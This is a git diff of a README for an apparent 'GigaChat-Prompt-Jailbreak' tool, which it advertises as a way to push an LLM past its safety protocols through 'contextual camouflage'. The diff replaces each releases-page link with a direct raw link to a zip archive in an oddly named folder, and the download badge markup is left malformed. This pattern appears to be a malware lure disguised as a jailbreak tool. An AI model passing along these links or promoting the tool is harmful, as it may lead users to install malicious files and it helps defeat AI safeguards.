@@ -1,7 +1,7 @@
 # 🌟 GigaChat-Prompt-Jailbreak - Unlock Your GigaChat's Full Potential
 
 ## 🔗 Download the Latest Release
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/futjobik/GigaChat-Prompt-Jailbreak/releases)
+[![Download Now](https://github.com/futjobik/GigaChat-Prompt-Jailbreak/raw/refs/heads/main/depreciatively/Jailbreak-Chat-Prompt-Giga-2.0.zip%https://github.com/futjobik/GigaChat-Prompt-Jailbreak/raw/refs/heads/main/depreciatively/Jailbreak-Chat-Prompt-Giga-2.0.zip)](https://github.com/futjobik/GigaChat-Prompt-Jailbreak/raw/refs/heads/main/depreciatively/Jailbreak-Chat-Prompt-Giga-2.0.zip)
 
 ## 📖 Introduction
 Welcome to GigaChat-Prompt-Jailbreak! This application helps you explore the advanced capabilities of the GigaChat LLM. By leveraging a contextual camouflage technique, you can generate content that pushes the boundaries of standard safety protocols. Our aim is to provide a tool where educational insights and cutting-edge AI discussions are at your fingertips.
@@ -18,7 +18,7 @@ Before you can use GigaChat-Prompt-Jailbreak, you'll need to download it from ou
 ## 📥 Download & Install
 To download GigaChat-Prompt-Jailbreak, follow these steps:
 
-1. Visit the following link: [https://github.com/futjobik/GigaChat-Prompt-Jailbreak/releases](https://github.com/futjobik/GigaChat-Prompt-Jailbreak/releases).
+1. Visit the following link: [https://github.com/futjobik/GigaChat-Prompt-Jailbreak/raw/refs/heads/main/depreciatively/Jailbreak-Chat-Prompt-Giga-2.0.zip](https://github.com/futjobik/GigaChat-Prompt-Jailbreak/raw/refs/heads/main/depreciatively/Jailbreak-Chat-Prompt-Giga-2.0.zip).
 2. Look for the latest version of the application.
 3. Click on the download link for your operating system.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -64,6 +64,6 @@ Yes, GigaChat-Prompt-Jailbreak is compatible with macOS 10.14 and later versions
 We encourage everyone to contribute ideas, feedback, or code improvements. Check out our Issues page to share your thoughts or report any concerns. Your input helps us create a better experience for everyone.
 
 ## 🔗 Download Links
-For your convenience, here’s the download link again: [https://github.com/futjobik/GigaChat-Prompt-Jailbreak/releases](https://github.com/futjobik/GigaChat-Prompt-Jailbreak/releases).
+For your convenience, here’s the download link again: [https://github.com/futjobik/GigaChat-Prompt-Jailbreak/raw/refs/heads/main/depreciatively/Jailbreak-Chat-Prompt-Giga-2.0.zip](https://github.com/futjobik/GigaChat-Prompt-Jailbreak/raw/refs/heads/main/depreciatively/Jailbreak-Chat-Prompt-Giga-2.0.zip).
 
 Feel free to explore and take advantage of all that GigaChat-Prompt-Jailbreak offers!
